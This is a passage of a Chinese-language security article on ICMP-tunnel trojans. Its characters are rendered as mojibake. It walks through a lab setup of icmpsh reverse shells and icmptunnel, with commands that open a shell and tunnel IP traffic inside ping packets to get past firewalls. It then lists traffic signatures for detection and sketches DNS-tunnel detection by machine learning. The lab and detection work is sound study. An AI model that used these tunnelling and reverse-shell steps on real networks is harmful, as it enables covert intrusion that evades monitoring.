åå¼¹ shell å»ºç«‹ session

> icmpsh.exe -t 192.168.30.130

[![](https://p1.ssl.qhimg.com/t0170e1170dfd0d8381.png)](https://p1.ssl.qhimg.com/t0170e1170dfd0d8381.png)

-r å‚æ•° åˆ©ç”¨ test è´¦æˆ·è¿›è¡Œæµ‹è¯•

> icmpsh.exe -t 192.168.30.130 -r

[![](https://p5.ssl.qhimg.com/t0125f80418f32b9d28.png)](https://p5.ssl.qhimg.com/t0125f80418f32b9d28.png)

3ï¼‰æ•°æ®åŒ…ç‰¹å¾

[![](https://p2.ssl.qhimg.com/t01be9fcd118a7ff938.png)](https://p2.ssl.qhimg.com/t01be9fcd118a7ff938.png)

4) Icmpsh â€“r å‚æ•°

[![](https://p2.ssl.qhimg.com/t018ba1bafcc8c3cfe1.png)](https://p2.ssl.qhimg.com/t018ba1bafcc8c3cfe1.png)

**icmptunnel**

icmptunnel å¯ä»¥å°† IP æµé‡å°è£…è¿› IMCP çš„ ping æ•°æ®åŒ…ä¸­ï¼Œæ—¨åœ¨åˆ©ç”¨ ping ç©¿é€é˜²ç«å¢™çš„æ£€æµ‹ã€‚

å¯¹äºéš§é“æ•°æ®ï¼Œicmptunnel é¦–å…ˆä¼šæŒ‡å®šå®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ç«¯ã€‚éšåï¼Œå®¢æˆ·ç«¯ä¼šå°† IP å¸§å°è£…åœ¨ ICMP è¯·æ±‚æ•°æ®åŒ…ä¸­å‘é€ç»™æœåŠ¡å™¨ï¼Œè€ŒæœåŠ¡å™¨ç«¯åˆ™ä¼šä½¿ç”¨ç›¸åŒ¹é…çš„ ICMP å“åº”æ•°æ®åŒ…è¿›è¡Œå›å¤ï¼ˆicmptunnel æä¾›åœ¨çŠ¶æ€æœºé˜²ç«å¢™å’Œ NAT ç½‘ç»œä¹‹é—´ï¼Œæ›´åŠ å¯é çš„è¿æ¥ï¼‰ã€‚

> [https://github.com/jamesbarlow/icmptunnel.git](https://github.com/jamesbarlow/icmptunnel.git)

ä¸€ã€ç¼–è¯‘

```
$ git clone https://github.com/jamesbarlow/icmptunnel.git  
$ cd icmptunnel/ 
$ make
```

[![](https://p2.ssl.qhimg.com/t01e61a8d52393782cf.png)](https://p2.ssl.qhimg.com/t01e61a8d52393782cf.png)

äºŒã€Usage  
Server ä¸ Client ç«¯ç¦æ­¢ ICMP å“åº”

> $ echo 1 >/proc/sys/net/ipv4/icmp_echo_ignore_all

[![](https://p1.ssl.qhimg.com/t011d5f7ee59fc4906b.png)](https://p1.ssl.qhimg.com/t011d5f7ee59fc4906b.png)

åœ¨æœåŠ¡ç«¯ä»¥æœåŠ¡å™¨æ¨¡å¼å¯åŠ¨ icmptunnelï¼Œå¹¶ç»™éš§é“æ¥å£åˆ†é…ä¸€ä¸ª IP åœ°å€

```
$./icmptunnel -s
openedtunnel device: tun0  
(ctrl-z)
$ bg
$ /sbin/ifconfig tun0 10.0.0.1 netmask255.255.255.0
```

[![](https://p0.ssl.qhimg.com/t012a0143b07a04f07a.png)](https://p0.ssl.qhimg.com/t012a0143b07a04f07a.png)

åœ¨å®¢æˆ·ç«¯ï¼Œä½¿ç”¨ icmptunnel è¿æ¥ä¸ŠæœåŠ¡å™¨ï¼Œå¹¶ç»™éš§é“æ¥å£åˆ†é…ä¸€ä¸ª IP åœ°å€

```
$ ./icmptunnel192.168.30.129
opened tunnel device: tun0  
connection established.  
(ctrl-z)
$ bg
$ /sbin/ifconfig tun0 10.0.0.2 netmask 255.255.255.0
```

[![](https://p0.ssl.qhimg.com/t012a0143b07a04f07a.png)](https://p0.ssl.qhimg.com/t012a0143b07a04f07a.png)

è¿™æ ·æˆ‘ä»¬å°±æ‹¥æœ‰ä¸€ä¸ªç«¯åˆ°ç«¯åŸºäº ICMP æ•°æ®åŒ…çš„éš§é“äº†, å…¶ä¸­æœåŠ¡å™¨åœ°å€ä¸º 10.10.0.1ï¼Œå®¢æˆ·ç«¯åœ°å€ä¸º 10.10.0.2, åœ¨å®¢æˆ·ç«¯å¯ä»¥å°è¯•é€šè¿‡ SSH è¿æ¥æœåŠ¡å™¨ï¼š

> $ssh [root@10.0.0](mailto:root@10.0.0).1

[![](https://p5.ssl.qhimg.com/t019b59d09887d99ebd.png)](https://p5.ssl.qhimg.com/t019b59d09887d99ebd.png)

æ•°æ®æµç‰¹å¾

[![](https://p1.ssl.qhimg.com/t0135fb189bbae9b1d4.png)](https://p1.ssl.qhimg.com/t0135fb189bbae9b1d4.png)  
æ£€æµ‹ä¸é˜²å¾¡ï¼š  
æ£€æµ‹ï¼š  
1ã€æ£€æµ‹åŒä¸€æ¥æº ICMP æ•°æ®åŒ…çš„æ•°é‡ã€‚ä¸€ä¸ªæ­£å¸¸çš„ ping æ¯ç§’æœ€å¤šåªä¼šå‘é€ä¸¤ä¸ªæ•°æ®åŒ…ï¼Œè€Œä½¿ç”¨ ICMP éš§é“çš„æµè§ˆå™¨åœ¨åŒä¸€æ—¶é—´ä¼šäº§ç”Ÿä¸Šåƒä¸ª ICMP æ•°æ®åŒ…ã€‚  
2ã€æ³¨æ„é‚£äº› ICMP æ•°æ®åŒ…ä¸­ payload å¤§äº 64 æ¯”ç‰¹çš„æ•°æ®åŒ…ã€‚å½“ç„¶ icmptunnel å¯ä»¥é…ç½®é™åˆ¶æ‰€æœ‰æ•°æ®åŒ…çš„ payload ä¸º 64 æ¯”ç‰¹ï¼Œè¿™æ ·ä¼šä½¿å¾—æ›´éš¾ä»¥è¢«æ£€æµ‹åˆ°ã€‚  
3ã€å¯»æ‰¾é‚£äº›å“åº”æ•°æ®åŒ…ä¸­ payload è·Ÿè¯·æ±‚æ•°æ®åŒ…ä¸ä¸€è‡´çš„ ICMP æ•°æ®åŒ…ã€‚  
4ã€æ£€æŸ¥ ICMP æ•°æ®åŒ…çš„åè®®æ ‡ç­¾ã€‚ä¾‹å¦‚ï¼Œicmptunnel ä¼šåœ¨æ‰€æœ‰çš„ ICMPpayload å‰é¢å¢åŠ  â€˜TUNLâ€™ æ ‡è®°ä»¥ç”¨äºè¯†åˆ«éš§é“ï¼Œè¿™å°±æ˜¯ç‰¹å¾ã€‚  
é˜²å¾¡ï¼šç¦æ­¢ pingã€‚

æ€»ç»“ä¸æ€è€ƒ
-----

åœ¨ä¸€å¼€å§‹ï¼Œæˆ‘ä»¬å°±ä»‹ç»äº†è½½è·åˆ†æå’Œæµé‡ç›‘æµ‹ä¸¤ç§å¸¸è§„çš„æ£€æµ‹æ–¹æ³•ï¼Œè¿™ä¸¤ç§æ–¹å¼ä¸é€‚ç”¨äºé«˜éšè”½æ€§æ–°å‹éš§é“æœ¨é©¬æ£€æµ‹ï¼Œä»æˆ‘ä»¬æµ‹è¯•æå–çš„ç‰¹å¾ä¸­ï¼Œå°†æ ·æœ¬ç‰¹å¾æ·»åŠ åˆ°è®¾å¤‡ä½œä¸ºç›‘æµ‹å¯¹è±¡æ•ˆç‡ä¾æ—§ä½ä¸‹ã€‚

æ€è€ƒï¼š

> æˆ‘ä»¬æ˜¯å¦å¯ä»¥ç”¨æ·±åº¦å­¦ä¹ ç®—æ³•åŠè‡ªåŠ¨æ£€æµ‹æŠ€æœ¯æ¥å®ç°å‘¢ï¼Ÿ

æˆ‘ä»¬å¯ä»¥ç»“åˆåè®®æœ¬èº«ï¼ŒåŸºäºé€šä¿¡è¡Œä¸ºæ£€æµ‹éš§é“æœ¨é©¬ï¼Œ, é‡‡ç”¨ Winpcap æ•°æ®åŒ…æ•è·æŠ€æœ¯çš„åº•å±‚è¿‡æ»¤æœºåˆ¶ï¼ŒæŠ“å– DNS æµé‡. å°†æŠ“å–çš„ DNS æµé‡æŒ‰ç…§äº”å…ƒç»„è¿›è¡Œèšç±», å½¢æˆ DNS ä¼šè¯æ•°æ®æµ. å°†ä¸€ä¸ªä¸ª DNS ä¼šè¯æ•°æ®æµæå–æˆ DNS ä¼šè¯è¯„ä¼°å‘é‡, ä½œä¸ºåˆ†ç±»è®­ç»ƒæ¨¡å—å’Œæœ¨é©¬æµé‡ç›‘æµ‹çš„è¾“å…¥ã€‚  
[![](https://p1.ssl.qhimg.com/t01318e5fa46b211649.png)](https://p1.ssl.qhimg.com/t01318e5fa46b211649.png)  
DNS éš§é“æœ¨é©¬æ£€æµ‹æµç¨‹æ¡†æ¶

ç›¸å…³é™„ä»¶
----

ä¸»è¦ä¸ºæœ¬æ¬¡å®éªŒçš„ç›¸å…³æµé‡åŒ…åŠ 2 ä¸ªè§†é¢‘

é“¾æ¥ï¼š[https://pan.baidu.com/s/1RdMYuUWhDYxKq0FQ7wLHmQ](https://pan.baidu.com/s/1RdMYuUWhDYxKq0FQ7wLHmQ)

æå–ç ï¼š4ygn

å‚è€ƒé“¾æ¥
----

[https://xz.aliyun.com/t/2214](https://xz.aliyun.com/t/2214)  
[https://www.blackhillsinfosec.com/powershell-dns-command-control-with-dnscat2-powershell/](https://www.blackhillsinfosec.com/powershell-dns-command-control-with-dnscat2-powershell/)  
[https://www.anquanke.com/post/id/152046](https://www.anquanke.com/post/id/152046)  
[https://klionsec.github.io/2017/10/31/icmp-tunnel/](https://klionsec.github.io/2017/10/31/icmp-tunnel/)  
[https://oing9179.github.io/blog/2017/06/The-ICMP-Tunnel/](https://oing9179.github.io/blog/2017/06/The-ICMP-Tunnel/)  
[https://www.cnblogs.com/KevinGeorge/p/8858718.html](https://www.cnblogs.com/KevinGeorge/p/8858718.html)  
[https://www.freebuf.com/articles/network/149328.html](https://www.freebuf.com/articles/network/149328.html)  
[https://www.anquanke.com/post/id/87228](https://www.anquanke.com/post/id/87228)